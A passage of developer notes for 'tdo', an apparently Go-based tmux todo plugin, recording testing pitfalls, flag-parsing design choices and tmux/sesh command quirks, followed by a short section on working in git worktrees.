  `--dir` normalises through **`scope.DirKey`, the same function `add` files with** — never a
  reimplementation, because "absolute, cleaned, symlink-resolved, worktrees folded" is pinned by
  tests over there and a second copy would drift, with the failure showing up as an empty list
  rather than an error. `DirKey` lstats, so it fails on a deleted directory; `--dir` falls back
  to a cleaned absolute path, which is exact unless a symlink was involved. That gap is real,
  documented in the usage text, and **asserted** by
  `TestListDirOfADeletedSymlinkedPathIsTheDocumentedGap` — a known limitation with no test
  becomes a silent regression the day someone "improves" the fallback.
- **A test that exercises a `--db` misparse can write a database into the repo.** The
  `list --db --json` leg of the dash-guard table creates a file literally called `--json` in
  whatever the cwd is whenever the guard is absent — which is exactly what a mutation proof
  arranges, and it got a 32KB SQLite file committed as `internal/cli/--json` once. The leg is
  worth keeping, so it does `t.Chdir(t.TempDir())` first. Any test whose *failure* mode is
  creating a file needs somewhere disposable to be standing.
- **stdlib `flag` stops at the first positional, and reordering around it needs
  the FlagSet itself.** `tdo add "text" --global` drops `--global` into
  `fs.Args()`, so it is silently ignored — a task filed to the wrong scope at exit
  0. `cli.parseArgs` hoists flag tokens ahead of positionals, but the hoist must
  ask the FlagSet whether each flag consumes the next token (`--db path`) or not
  (`--global`); a naive "move positionals to the end" reorder makes
  `add "text" --db path` feed the task text to `--db`. Consequence: dash-leading
  task text needs an explicit `--`. That is deliberate — absorbing dash tokens as
  text would file `tdo add x -sesion` as a task named "-sesion" and exit 0, which
  is the same silent-wrong-scope failure the hoist exists to prevent.
- **A golden file typed by hand beats one captured from output.**
  `internal/cli/testdata/list.json` was written from the brief's literal before
  the encoder existed and matched byte-for-byte on the first run, which is what
  makes it evidence that the *contract* is implemented. A golden captured from
  `tdo list --json` would have pinned any bug just as firmly and passed just as
  green — it proves only that the code agrees with itself.
- **The `tui.Config` the popup gets is only valid *during* `runTUIProgram`.** `runTUI` defers
  `closeDB`, so a test that captures the Config through the seam and then asserts on it after
  `Run` returns is holding a closed handle — `cfg.DB.Count` answers `sql: database is closed`.
  Anything that has to touch the store (as opposed to comparing `DB.Path()`) belongs inside
  the substituted program, which is the only moment the popup itself would have had it.
  `internal/cli/wiring_test.go` probes there and keeps the result on its fixture.
- **`t.Helper()` in a table of assertion closures hides which assertion fired.** The whole
  table reports at the dispatch line. `wiringChecks` leaves it off deliberately — each entry
  runs in its own subtest, so the field name is already in the test name and the line number
  is worth more than the tidy stack.
- **A `go test` process is *not* TTY-less inside tmux, and that hung `make test` for
  months of commits.** Bubble Tea opens `/dev/tty` directly, so redirecting a test's stdout
  hides nothing from it: `tui.Run` really renders the popup into the developer's pane and
  blocks forever on a keystroke. `go test ./...` prints package results in command-line
  order, so one hung package means `make test` never finishes — and for a tmux plugin,
  "inside tmux" is where every developer runs it. `internal/cli` starts the popup through
  `var runTUIProgram = tui.Run` so a test can substitute it. Any future package that starts a
  terminal program from a test needs the same seam; and note the guard has to fail *outside*
  tmux too (it asserts the substituted program ran), because a hang is invisible to CI.
- **`tmux list-keys -T <table> <key>` prints NOTHING and exits 0** on 3.7b — for a key
  that *is* bound. The `-T` filter and a key argument do not combine; `list-keys <key>`
  with no `-T` works but spans every table. So a check built on the combined form answers
  "not bound" for a binding sitting right there — the wrong direction to be wrong in, since
  an assertion of zero passes. `test/plugin_install_test.sh` awks over the whole table
  instead (`$4 == key`), which is also what keeps it counting the *plugin's* bindings rather
  than tmux's own defaults.
- **`=` is a *session* target prefix, and `send-keys`/`capture-pane` reject it.**
  `capture-pane -t '=work'` answers `can't find pane: =work` on 3.7b even when the session
  exists, so `target()`'s `=` must not be pasted into pane-targeting commands. And in **zsh**
  a bare `=work` is command-path expansion (`=word` → `$(which word)`), which fails with
  `word not found` before tmux ever sees it — quote every `=` target in a zsh shell.
- **tmux target names need `=` to match exactly** — `switch-client -t dev` will happily land
  on `dev-2`, since tmux falls back to prefix and then fnmatch matching. `internal/cli`'s
  `target()` prepends it. **But do not apply it to `new-session -s`**: that argument is a name
  to *create*, not a target to match, so `=work` would create a session literally called
  `=work`. A name containing `:` cannot be targeted at all — tmux splits on it — which is why
  re-home exists as the way out.
- **`tmux switch-client` works from *inside* a `display-popup -E` command**, and takes effect
  immediately rather than needing the popup to close first: the client moves while the popup's
  command is still running, and stays there after it exits. Verified on 3.7b. So the jump
  needs no deferred-execution machinery — `internal/cli` just runs it before `tdo` returns.
  (`display-popup` needs `-c <client>`; `-t <session>` fails with "no current client". To get
  an attached client headlessly, attach from inside another pane's pty — `TMUX=` must be
  cleared or tmux refuses to nest.)
- **`sesh connect` needs `-s`/`--switch` inside a popup**, because the client is already
  attached and bare `connect` *attaches*. And `sesh` may not know the name at all: `sesh list`
  blends live sessions, zoxide directories and config entries, while a stale tdo scope key is
  a *dead tmux session name*. Every sesh call therefore has a `tmux new-session -d` +
  `switch-client` fallback behind it — `sesh` is an optional enhancement, never a dependency.

## Worktrees

Work happens in `git worktree` checkouts (`../todo-<task-slug>`). No env files or
bootstrap scripts: `make build` and `make test` work in a fresh worktree once the
module cache is warm. `bin/` is gitignored per worktree.
